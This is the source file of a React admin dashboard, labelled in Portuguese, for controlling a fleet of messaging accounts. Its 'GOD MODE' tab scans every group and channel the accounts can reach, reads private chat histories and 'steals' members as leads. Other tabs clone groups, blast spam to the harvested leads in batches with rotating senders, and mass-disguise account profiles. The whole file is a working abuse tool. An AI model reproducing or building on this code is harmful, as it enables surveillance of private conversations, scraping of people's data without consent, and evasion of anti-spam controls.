import { useState, useEffect } from 'react';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  
  const [tab, setTab] = useState('spy'); 
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // Controle de Campanha
  const [processing, setProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [checkingStatus, setCheckingStatus] = useState(false);

  // --- GOD MODE STATES ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);

  // Tools
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    if (savedGroups) setAllGroups(JSON.parse(savedGroups));
    if (savedChannels) setAllChannels(JSON.parse(savedChannels));
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setIsAuthenticated(true); 
          fetchData(); 
      } else {
          alert('Senha incorreta');
      }
    } catch (e) { alert('Erro de conexão'); }
  };

  const fetchData = async () => {
    try {
      const sRes = await fetch('/api/list-sessions');
      const sData = await sRes.json();
      setSessions(sData.sessions || []);
      
      const stRes = await fetch('/api/stats');
      if (stRes.ok) setStats(await stRes.json());
    } catch (e) { console.error(e); }
  };

  const addLog = (text) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);

  // --- GOD MODE: ESCANEAR REDE ---
  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta conectada para escanear.");
      setIsScanning(true);
      setScanProgress(0);

      let groups = [];
      let channels = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          
          try {
              const res = await fetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              const data = await res.json();
              
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') channels.push(chatObj);
                      else groups.push(chatObj);
                  });
              }
          } catch (e) { console.error(`Erro ao ler ${phone}`); }
      }

      const uniqueGroups = [...new Map(groups.map(item => [item.id, item])).values()];
      const uniqueChannels = [...new Map(channels.map(item => [item.id, item])).values()];

      uniqueGroups.sort((a,b) => b.participantsCount - a.participantsCount);
      uniqueChannels.sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups);
      setAllChannels(uniqueChannels);
      
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));

      setIsScanning(false);
      alert(`Varredura completa! ${uniqueGroups.length} Grupos e ${uniqueChannels.length} Canais encontrados.`);
  };

  // --- AÇÕES DO ESPIÃO ---
  const openChat = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
        const res = await fetch('/api/spy/get-history', { 
            method: 'POST', 
            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id }), 
            headers: {'Content-Type': 'application/json'} 
        });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) { alert('Erro ao carregar mensagens'); }
      setLoadingHistory(false);
  };

  const stealLeads = async (chat) => {
      const action = chat.type === 'Canal' ? 'Tentar extrair comentários' : 'Roubar leads';
      if(!confirm(`${action} de "${chat.title}" usando a conta ${chat.ownerPhone}?`)) return;
      
      addLog(`🕷️ Iniciando extração em ${chat.title}...`);
      
      const res = await fetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title, 
              isChannel: chat.type === 'Canal' 
          }), 
          headers: {'Content-Type': 'application/json'} 
      });
      const data = await res.json();
      
      if(data.success) {
          addLog(`✅ ${data.message}`);
          fetchData(); 
      } else {
          addLog(`❌ Erro: ${data.error}`);
          alert(`Erro: ${data.error}`);
      }
  };

  const cloneGroup = async (chat) => {
      if(!confirm(`Clonar estrutura de "${chat.title}"?`)) return;
      const res = await fetch('/api/spy/clone-group', {
          method: 'POST',
          body: JSON.stringify({ phone: chat.ownerPhone, originalChatId: chat.id, originalTitle: chat.title }),
          headers: {'Content-Type': 'application/json'}
      });
      if(res.ok) addLog(`✅ Clonagem de ${chat.title} iniciada.`);
      else addLog('❌ Erro na clonagem.');
  };

  // --- DASHBOARD E DISPARO ---
  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('🔍 Verificando conexões...');
      let newSessions = [...sessions];
      for(let i=0; i<newSessions.length; i++) {
          try {
              const res = await fetch('/api/check-status', {
                  method: 'POST',
                  body: JSON.stringify({ phone: newSessions[i].phone_number }),
                  headers: {'Content-Type': 'application/json'}
              });
              const data = await res.json();
              newSessions[i].is_active = (data.status === 'alive');
              setSessions([...newSessions]); 
          } catch(e) {}
      }
      setCheckingStatus(false);
      addLog('✅ Verificação completa.');
      fetchData();
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) newSet.delete(phone); else newSet.add(phone);
    setSelectedPhones(newSet);
  };

  const selectAll = () => {
      const newSet = new Set();
      sessions.forEach(s => { if(s.is_active) newSet.add(s.phone_number) });
      setSelectedPhones(newSet);
  };

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas!');
     if(!confirm(`⚠️ TURBO: Disparar para ${stats.pending} leads usando ${selectedPhones.size} contas?`)) return;

     setProcessing(true);
     setProgress(0);
     addLog('🚀 INICIANDO MODO TURBO...');
     
     try {
         const res = await fetch('/api/get-campaign-leads'); 
         const data = await res.json();
         const leads = data.leads || [];
         if (leads.length === 0) { setProcessing(false); return alert('Sem leads pendentes!'); }
         
         const phones = Array.from(selectedPhones);
         const BATCH_SIZE = 20; 
         
         for (let i = 0; i < leads.length; i += BATCH_SIZE) {
             const batch = leads.slice(i, i + BATCH_SIZE);
             const promises = [];

             batch.forEach((lead, index) => {
                 const senderIndex = (i + index) % phones.length;
                 const sender = phones[senderIndex];
                 promises.push(
                     fetch('/api/dispatch', {
                        method: 'POST', headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ senderPhone: sender, target: lead.user_id, message: msg, leadDbId: lead.id })
                     }).then(r => r.json()).then(d => { if(!d.success) addLog(`❌ Falha ${sender}: ${d.error}`); })
                 );
             });

             await Promise.all(promises);
             const percent = Math.round(((i + batch.length) / leads.length) * 100);
             setProgress(percent);
             addLog(`⚡ Lote ${i/BATCH_SIZE + 1} enviado (${percent}%)`);
             await new Promise(r => setTimeout(r, 1000));
         }
         addLog('✅ CAMPANHA FINALIZADA!'); fetchData();
     } catch (e) { addLog(`⛔ Erro: ${e.message}`); }
     setProcessing(false);
  };

  const handleDelete = async (phone) => {
      if(!confirm(`Remover ${phone}?`)) return;
      await fetch('/api/delete-session', { method: 'POST', body: JSON.stringify({phone}), headers: {'Content-Type': 'application/json'} });
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };
    
  const handleUpdateProfile = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas!');
    setProcessing(true);
    for (const phone of Array.from(selectedPhones)) {
        addLog(`🎭 Atualizando ${phone}...`);
        await fetch('/api/update-profile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone, newName, photoUrl }) });
    }
    setProcessing(false); addLog('✅ Feito.');
  };

  const filteredGroups = filterNumber ? allGroups.filter(g => g.ownerPhone.includes(filterNumber)) : allGroups;
  const filteredChannels = filterNumber ? allChannels.filter(c => c.ownerPhone.includes(filterNumber)) : allChannels;
  const activeCount = sessions.filter(s => s.is_active).length;
  const deadCount = sessions.length - activeCount;

  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin}><input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha Admin" style={{padding:'10px', borderRadius:'5px'}}/></form>
      </div>
  );

  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        
        {/* MODAL DE CHAT */}
        {viewingChat && (
            <div style={{position:'fixed', top:0, left:0, width:'100%', height:'100%', background:'rgba(0,0,0,0.9)', zIndex:999, display:'flex', alignItems:'center', justifyContent:'center'}}>
                <div style={{width:'600px', height:'80%', background:'#161b22', border:'1px solid #30363d', borderRadius:'10px', display:'flex', flexDirection:'column'}}>
                    <div style={{padding:'15px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', background:'#21262d'}}>
                        <div>
                            <h3 style={{margin:0, color:'white'}}>{viewingChat.title}</h3>
                            <small>Via: {viewingChat.ownerPhone}</small>
                        </div>
                        <button onClick={()=>setViewingChat(null)} style={{background:'none', border:'none', color:'red', fontSize:'20px', cursor:'pointer'}}>✖</button>
                    </div>
                    <div style={{flex:1, overflowY:'auto', padding:'15px', display:'flex', flexDirection:'column', gap:'10px'}}>
                        {loadingHistory ? <p style={{textAlign:'center'}}>Carregando (com mídia)...</p> : 
                            chatHistory.length === 0 ? <p style={{textAlign:'center'}}>Histórico vazio.</p> :
                            chatHistory.map((m, i) => (
                                <div key={i} style={{alignSelf: m.isOut ? 'flex-end' : 'flex-start', background: m.isOut ? '#238636' : '#30363d', padding:'10px', borderRadius:'8px', maxWidth:'80%'}}>
                                    <div style={{fontSize:'10px', opacity:0.7, marginBottom:'2px'}}>{m.sender}</div>
                                    {m.media && (<div style={{marginBottom:'5px'}}><img src={m.media} alt="Mídia" style={{maxWidth:'100%', borderRadius:'5px'}} /></div>)}
                                    <div style={{color:'white'}}>{m.text}</div>
                                </div>
                            ))
                        }
                    </div>
                </div>
            </div>
        )}

        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px'}}>
            <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'transparent', border:'1px solid #238636', color:'white', borderRadius:'5px', cursor:'pointer'}}>🚀 CRM (TURBO)</button>
            <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', border:'1px solid #8957e5', color:'white', borderRadius:'5px', cursor:'pointer'}}>👁️ GOD MODE</button>
            <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', border:'1px solid #1f6feb', color:'white', borderRadius:'5px', cursor:'pointer'}}>🛠️ TOOLS</button>
        </div>

        {tab === 'spy' && (
            <div>
                <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'20px', background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                    <div>
                        <h2 style={{margin:0, color:'white'}}>Radar Global</h2>
                        <div style={{fontSize:'12px', color:'#8b949e'}}>{allGroups.length} Grupos | {allChannels.length} Canais</div>
                    </div>
                    <div style={{display:'flex', gap:'10px'}}>
                        <input type="text" placeholder="Filtrar por número..." value={filterNumber} onChange={e => setFilterNumber(e.target.value)} style={{padding:'10px', borderRadius:'5px', background:'#0d1117', border:'1px solid #30363d', color:'white'}}/>
                        <button onClick={scanNetwork} disabled={isScanning} style={{padding:'10px 20px', background:'#8957e5', color:'white', border:'none', borderRadius:'5px', cursor:'pointer', fontWeight:'bold'}}>{isScanning ? `LENDO ${scanProgress}%` : '🔄 ESCANEAR TUDO'}</button>
                    </div>
                </div>

                <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'20px'}}>
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#d29922', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>👥 GRUPOS</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredGroups.map(g => (
                                <div key={g.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{g.photo ? <img src={g.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>👥</div>}</div>
                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{g.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{g.participantsCount} leads • {g.ownerPhone}</div></div>
                                    <button onClick={()=>openChat(g)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(g)} style={{background:'#d29922', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'12px', padding:'5px 10px'}}>🕷️ ROUBAR</button>
                                </div>
                            ))}
                        </div>
                    </div>
                    <div style={{background:'#161b22', padding:'15px', borderRadius:'8px'}}>
                        <h3 style={{color:'#3390ec', borderBottom:'1px solid #30363d', paddingBottom:'10px', marginTop:0}}>📢 CANAIS</h3>
                        <div style={{maxHeight:'70vh', overflowY:'auto'}}>
                            {filteredChannels.map(c => (
                                <div key={c.id} style={{display:'flex', alignItems:'center', gap:'10px', padding:'10px', borderBottom:'1px solid #21262d'}}>
                                    <div style={{width:'40px', height:'40px', borderRadius:'50%', background:'#30363d', overflow:'hidden'}}>{c.photo ? <img src={c.photo} style={{width:'100%', height:'100%'}}/> : <div style={{textAlign:'center', lineHeight:'40px'}}>📢</div>}</div>
                                    <div style={{flex:1}}><div style={{fontWeight:'bold', color:'white', whiteSpace:'nowrap', overflow:'hidden', textOverflow:'ellipsis', maxWidth:'200px'}}>{c.title}</div><div style={{fontSize:'11px', color:'#8b949e'}}>{c.participantsCount} inscritos • {c.ownerPhone}</div></div>
                                    <button onClick={()=>openChat(c)} style={{background:'#21262d', border:'1px solid #30363d', color:'white', borderRadius:'4px', cursor:'pointer'}}>👁️</button>
                                    <button onClick={()=>stealLeads(c)} style={{background:'#1f6feb', border:'none', color:'white', borderRadius:'4px', cursor:'pointer', fontWeight:'bold', fontSize:'10px', padding:'5px 10px'}}>🕷️ TENTAR</button>
                                    <button onClick={()=>cloneGroup(c)} style={{background:'#238636', border:'none', color:'white', borderRadius:'4px', cursor:'pointer'}}>🐑</button>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            </div>
        )}

        {tab === 'dashboard' && (
            <div style={{display:'grid', gridTemplateColumns:'2fr 1fr', gap:'20px'}}>
                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', gap:'20px', marginBottom:'20px'}}>
                        <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #d29922'}}><h2 style={{margin:0, color:'#d29922'}}>{stats.pending}</h2><small>Faltam Enviar</small></div>
                        <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #238636'}}><h2 style={{margin:0, color:'#238636'}}>{stats.sent}</h2><small>Já Enviados</small></div>
                         <div style={{flex:1, background:'#0d1117', padding:'15px', textAlign:'center', border:'1px solid #3390ec'}}><h2 style={{margin:0, color:'#3390ec'}}>{progress}%</h2><small>Progresso</small></div>
                    </div>
                    <h3>📢 Mensagem</h3>
                    <textarea value={msg} onChange={e=>setMsg(e.target.value)} style={{width:'100%', height:'80px', background:'#0d1117', color:'white', border:'1px solid #30363d', padding:'10px', borderRadius:'5px'}}/>
                    <button onClick={startRealCampaign} disabled={processing} style={{marginTop:'15px', padding:'20px', width:'100%', background: processing ? '#21262d' : '#238636', color:'white', border:'none', borderRadius:'8px', fontWeight:'bold', fontSize:'16px', cursor: processing ? 'not-allowed' : 'pointer'}}>{processing ? `🚀 ENVIANDO... ${progress}%` : '🔥 INICIAR DISPARO TURBO'}</button>
                    <div style={{marginTop:'20px', height:'200px', overflowY:'auto', background:'#000', padding:'10px', fontSize:'12px', borderRadius:'5px'}}>{logs.map((l,i)=><div key={i}>{l}</div>)}</div>
                </div>

                <div style={{background:'#161b22', padding:'20px', borderRadius:'8px'}}>
                    <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'15px'}}>
                        <h3 style={{margin:0}}>Contas ({sessions.length})</h3>
                        <button onClick={checkAllStatus} disabled={checkingStatus} style={{fontSize:'12px', padding:'5px 10px', background:'#1f6feb', color:'white', border:'none', borderRadius:'4px', cursor:'pointer'}}>{checkingStatus ? '...' : '🔄 Check'}</button>
                    </div>
                    <div style={{display:'flex', gap:'10px', marginBottom:'15px', fontSize:'12px'}}><span style={{color:'#238636'}}>🟢 {activeCount} Online</span><span style={{color:'#ff5c5c'}}>🔴 {deadCount} Offline</span></div>
                    <button onClick={selectAll} style={{width:'100%', marginBottom:'10px', padding:'8px', background:'#30363d', color:'white', border:'none', cursor:'pointer'}}>Selecionar Todos Ativos</button>
                    <div style={{maxHeight:'600px', overflowY:'auto'}}>
                        {sessions.map(s => (
                            <div key={s.id} style={{padding:'10px', borderBottom:'1px solid #30363d', display:'flex', justifyContent:'space-between', alignItems:'center', background: selectedPhones.has(s.phone_number) ? '#21262d' : 'transparent'}}>
                                <div><span style={{fontSize:'10px', marginRight:'5px'}}>{s.is_active ? '🟢' : '🔴'}</span><span style={{fontSize:'13px', color: s.is_active ? 'white' : '#8b949e'}}>{s.phone_number}</span></div>
                                <div><button onClick={()=>toggleSelect(s.phone_number)} style={{marginRight:'5px', cursor:'pointer'}}>{selectedPhones.has(s.phone_number)?'✓':'+'}</button><button onClick={()=>handleDelete(s.phone_number)} style={{background:'none', border:'none', cursor:'pointer'}}>🗑️</button></div>
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        )}
        
        {tab === 'tools' && (
             <div style={{ backgroundColor: '#161b22', padding: '20px' }}>
                <h3>🎭 Camuflagem em Massa</h3>
                <input type="text" placeholder="Nome" value={newName} onChange={e => setNewName(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <input type="text" placeholder="Foto URL" value={photoUrl} onChange={e => setPhotoUrl(e.target.value)} style={{ width: '100%', marginBottom: '10px', padding: '10px', background: '#0d1117', border: '1px solid #30363d', color: 'white' }} />
                <button onClick={handleUpdateProfile} style={{ width: '100%', padding: '10px', background: '#8957e5', color: 'white', border: 'none' }}>ATUALIZAR PERFIS</button>
            </div>
        )}
    </div>
  );
}
